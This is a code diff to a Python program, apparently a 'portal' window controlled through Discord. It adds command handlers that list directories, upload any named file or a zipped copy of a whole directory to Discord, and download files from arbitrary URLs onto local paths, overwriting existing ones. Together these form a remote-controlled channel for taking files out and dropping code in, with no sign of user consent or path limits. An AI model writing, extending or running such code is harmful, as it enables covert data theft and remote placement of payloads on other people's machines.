@@ -89,6 +89,10 @@ def _post_file_to_discord(content, file_path):
         boundary = f"----WebKitFormBoundary{os.urandom(8).hex()}"
         payload_json = json.dumps({"content": content[:1900]})
 
+        # Guess content type from extension
+        from mimetypes import guess_type
+        content_type = guess_type(file_path)[0] or "application/octet-stream"
+
         body = b""
         body += f"--{boundary}\r\n".encode()
         body += b'Content-Disposition: form-data; name="payload_json"\r\n'
@@ -98,7 +102,7 @@ def _post_file_to_discord(content, file_path):
         body += f"--{boundary}\r\n".encode()
         body += (f'Content-Disposition: form-data; name="files[0]"; '
                  f'filename="{Path(file_path).name}"\r\n').encode()
-        body += b"Content-Type: text/plain\r\n\r\n"
+        body += f"Content-Type: {content_type}\r\n\r\n".encode()
         body += file_data + b"\r\n"
         body += f"--{boundary}--\r\n".encode()
 
@@ -220,6 +224,45 @@ def _write_temp(text):
     with os.fdopen(fd, "w", encoding="utf-8") as f:
         f.write(text)
     return path
+
+
+def _write_temp_binary(data, suffix=".bin"):
+    import tempfile
+    fd, path = tempfile.mkstemp(suffix=suffix, prefix="portal_")
+    with os.fdopen(fd, "wb") as f:
+        f.write(data)
+    return path
+
+
+def _zip_directory(path, output_path=None):
+    """Zip the contents of a directory, return the zip file path."""
+    import tempfile, zipfile
+    p = Path(path)
+    if not p.exists() or not p.is_dir():
+        return None
+    if output_path is None:
+        fd, output_path = tempfile.mkstemp(suffix=".zip", prefix="portal_")
+        os.close(fd)
+    with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zf:
+        for f in p.rglob("*"):
+            if f.is_file():
+                zf.write(f, f.relative_to(p))
+    return output_path
+
+
+def _simple_list_files(path):
+    """Return a simple flat list of files in the directory."""
+    p = Path(path)
+    if not p.exists() or not p.is_dir():
+        return f"Path does not exist: {path}"
+    files = sorted(p.iterdir())
+    lines = [f"Files in: {p}", ""]
+    for f in files:
+        if f.is_file():
+            size = f.stat().st_size
+            size_str = f"{size} bytes" if size < 1024 else f"{size // 1024} KB"
+            lines.append(f"  {f.name}  ({size_str})")
+    return "\n".join(lines)
 
 
 # ------------------------------------------------------------------
@@ -942,6 +985,59 @@ class PortalWindow:
             result = _scan_directory(path)
             _post_file_to_discord(f"{tag} Scan result for: {path}", _write_temp(result))
             return True, result
+
+        elif cmd_type == "view":
+            raw_path = cmd.get("path", ".")
+            if raw_path == "." and self.portal_folder:
+                path = self.portal_folder
+            else:
+                path = raw_path
+            result = _simple_list_files(path)
+            _post_to_discord(f"{tag} {result}")
+            return True, result
+
+        elif cmd_type == "fetch":
+            path = cmd.get("path", "")
+            if not path or not Path(path).exists():
+                return False, f"File not found: {path}"
+            _post_file_to_discord(f"{tag} Fetched: {path}", path)
+            return True, f"Fetched: {path}"
+
+        elif cmd_type == "fetchall":
+            raw_path = cmd.get("path", ".")
+            if raw_path == "." and self.portal_folder:
+                path = self.portal_folder
+            else:
+                path = raw_path
+            zip_path = _zip_directory(path)
+            if not zip_path:
+                return False, f"Could not zip: {path}"
+            _post_file_to_discord(f"{tag} All files from: {path}", zip_path)
+            return True, f"Sent zip of {path}"
+
+        elif cmd_type == "add":
+            path = cmd.get("path", "")
+            url = cmd.get("url", "")
+            if not path or not url:
+                return False, "Missing path or url"
+            if Path(path).exists():
+                return False, f"File already exists: {path}. Use /replace to overwrite."
+            ok, msg = _download_file(url, path)
+            _post_to_discord(f"{tag} {msg}")
+            return ok, msg
+
+        elif cmd_type == "replace":
+            path = cmd.get("path", "")
+            url = cmd.get("url", "")
+            if not path or not url:
+                return False, "Missing path or url"
+            try:
+                Path(path).unlink()
+            except Exception:
+                pass
+            ok, msg = _download_file(url, path)
+            _post_to_discord(f"{tag} {msg}")
+            return ok, msg
 
         elif cmd_type == "check_packages":
             result = _check_packages()
